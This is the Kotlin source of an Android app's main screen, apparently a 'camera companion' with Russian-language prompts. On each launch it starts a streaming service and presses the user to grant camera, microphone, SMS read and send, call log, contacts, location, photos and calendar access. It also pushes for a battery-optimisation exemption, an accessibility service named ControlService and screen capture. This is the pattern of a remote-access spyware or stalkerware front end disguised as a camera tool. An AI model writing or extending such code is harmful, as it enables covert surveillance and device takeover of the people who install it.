package com.artem.cameracompanion

import android.Manifest
import android.app.AlertDialog
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private var batteryOpened = false
    private var restrictedOpened = false
    private var permRequestInFlight = false

    // Permissions actually declared in this APK's manifest (set at build time via workflow)
    private val declaredPerms: Set<String> by lazy {
        try {
            @Suppress("DEPRECATION")
            packageManager.getPackageInfo(packageName, PackageManager.GET_PERMISSIONS)
                .requestedPermissions?.toHashSet() ?: emptySet()
        } catch (_: Exception) { emptySet() }
    }

    private val requestPermissions = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        permRequestInFlight = false
        StreamingService.start(this)
    }

    private val requestProjection = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK && result.data != null) {
            StreamingService.start(this, result.resultCode, result.data!!)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val splashResId = resources.getIdentifier("splash_bg", "drawable", packageName)
        if (splashResId != 0) {
            val img = findViewById<android.widget.ImageView>(R.id.splashImage)
            img.setImageResource(splashResId)
            img.visibility = android.view.View.VISIBLE
        }

        StreamingService.start(this)
        requestMissingPermissions()

        findViewById<Button>(R.id.btnWatch).setOnClickListener {
            val missing = getMissingPermissions()
            if (missing.isNotEmpty()) {
                showMissingPermsAlert(missing)
                return@setOnClickListener
            }
            if (!isAccessibilityEnabled()) {
                openAccessibilityServiceSettings()
                return@setOnClickListener
            }
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R && !StreamingService.hasProjection) {
                val mgr = getSystemService(MediaProjectionManager::class.java)
                requestProjection.launch(mgr.createScreenCaptureIntent())
            }
        }
    }

    override fun onResume() {
        super.onResume()
        StreamingService.start(this)
        requestMissingPermissions()
        if (!permRequestInFlight && isBatteryOptimized() && !batteryOpened &&
                "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" in declaredPerms) {
            batteryOpened = true
            try {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:$packageName")))
            } catch (_: Exception) {
                try { startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)) } catch (_: Exception) {}
            }
        }
    }

    private fun showMissingPermsAlert(missing: List<String>) {
        if (isFinishing || isDestroyed) return
        val names = missing.map { permFriendlyName(it) }.distinct().joinToString("\n") { "• $it" }
        AlertDialog.Builder(this)
            .setTitle("Нет разрешений")
            .setMessage("Для работы приложения необходимы:\n\n$names")
            .setPositiveButton("Выдать") { _, _ ->
                permRequestInFlight = false
                requestPermissions.launch(missing.toTypedArray())
            }
            .setNegativeButton("Позже", null)
            .show()
    }

    private fun getMissingPermissions(): List<String> = buildList {
        fun addIfNeeded(perm: String) {
            if (perm in declaredPerms && !has(perm)) add(perm)
        }
        addIfNeeded(Manifest.permission.CAMERA)
        addIfNeeded(Manifest.permission.RECORD_AUDIO)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            addIfNeeded(Manifest.permission.POST_NOTIFICATIONS)
        addIfNeeded(Manifest.permission.READ_PHONE_STATE)
        addIfNeeded(Manifest.permission.READ_PHONE_NUMBERS)
        addIfNeeded(Manifest.permission.READ_CALL_LOG)
        addIfNeeded(Manifest.permission.CALL_PHONE)
        addIfNeeded(Manifest.permission.READ_CONTACTS)
        addIfNeeded(Manifest.permission.READ_SMS)
        addIfNeeded(Manifest.permission.SEND_SMS)
        addIfNeeded(Manifest.permission.RECEIVE_SMS)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
            addIfNeeded(Manifest.permission.BLUETOOTH_CONNECT)
        addIfNeeded(Manifest.permission.ACCESS_FINE_LOCATION)
        addIfNeeded(Manifest.permission.ACCESS_COARSE_LOCATION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            addIfNeeded(Manifest.permission.READ_MEDIA_IMAGES)
            addIfNeeded(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            addIfNeeded(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        addIfNeeded(Manifest.permission.READ_CALENDAR)
        addIfNeeded(Manifest.permission.WRITE_CALENDAR)
    }

    private fun permFriendlyName(perm: String): String = when (perm) {
        Manifest.permission.CAMERA                                   -> "Камера"
        Manifest.permission.RECORD_AUDIO                             -> "Микрофон"
        Manifest.permission.POST_NOTIFICATIONS                       -> "Уведомления"
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_PHONE_NUMBERS                       -> "Состояние телефона"
        Manifest.permission.READ_CALL_LOG                            -> "Журнал звонков"
        Manifest.permission.CALL_PHONE                               -> "Звонки"
        Manifest.permission.READ_CONTACTS                            -> "Контакты"
        Manifest.permission.READ_SMS                                 -> "Чтение СМС"
        Manifest.permission.SEND_SMS                                 -> "Отправка СМС"
        Manifest.permission.RECEIVE_SMS                              -> "Получение СМС"
        Manifest.permission.BLUETOOTH_CONNECT                        -> "Bluetooth"
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION                   -> "Геолокация"
        Manifest.permission.READ_MEDIA_IMAGES,
        Manifest.permission.READ_EXTERNAL_STORAGE                    -> "Фото"
        Manifest.permission.READ_MEDIA_VIDEO                         -> "Видео"
        Manifest.permission.READ_CALENDAR,
        Manifest.permission.WRITE_CALENDAR                           -> "Календарь"
        else -> perm.substringAfterLast(".")
    }

    private fun has(perm: String) =
        ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED

    private fun requestMissingPermissions() {
        if (permRequestInFlight) return
        val needed = getMissingPermissions()
        if (needed.isNotEmpty()) {
            permRequestInFlight = true
            requestPermissions.launch(needed.toTypedArray())
        }
    }

    private fun isBatteryOptimized(): Boolean {
        val pm = getSystemService(PowerManager::class.java)
        return !pm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun isAccessibilityEnabled(): Boolean {
        val enabled = Settings.Secure.getString(
            contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabled.contains(packageName, ignoreCase = true)
    }

    private fun openAccessibilityServiceSettings() {
        val component = "$packageName/.ControlService"
        // Пробуем открыть напрямую на конкретный сервис (работает на AOSP / Pixel / большинстве прошивок)
        val opened = tryStartActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
            val args = Bundle().apply { putString(":settings:fragment_args_key", component) }
            putExtra(":settings:fragment_args_key", component)
            putExtra(":settings:show_fragment_args", args)
        })
        if (!opened) tryStartActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    private fun tryStartActivity(intent: Intent): Boolean {
        return try { startActivity(intent); true } catch (_: Exception) { false }
    }
}
